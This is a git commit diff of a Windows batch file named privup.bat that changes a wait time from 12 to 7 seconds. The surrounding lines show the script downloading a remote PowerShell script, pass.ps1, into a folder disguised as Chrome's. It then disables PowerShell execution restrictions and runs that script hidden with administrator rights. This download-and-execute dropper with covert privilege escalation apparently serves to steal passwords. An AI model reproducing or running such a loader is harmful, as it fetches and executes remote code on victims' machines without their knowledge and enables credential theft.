0f5eea1e9427ee9c5eb4daddb4e74f78f6b77a06
İsmayil <60405884+4V4loon@users.noreply.github.com>
2021-12-13 19:38:06 +0400

    Update privup.bat

--- privup.bat
+++ privup.bat
@@ -5,5 +5,5 @@ IF %ERRORLEVEL% EQU 0 ( goto :run ) else ( goto :while )
 
 :run
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pass.ps1' -OutFile $env:appdata\Chrome\pass.ps1"
-timeout /t 12
+timeout /t 7
 powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Chrome\pass.ps1' -WindowStyle Hidden -Verb RunAs"
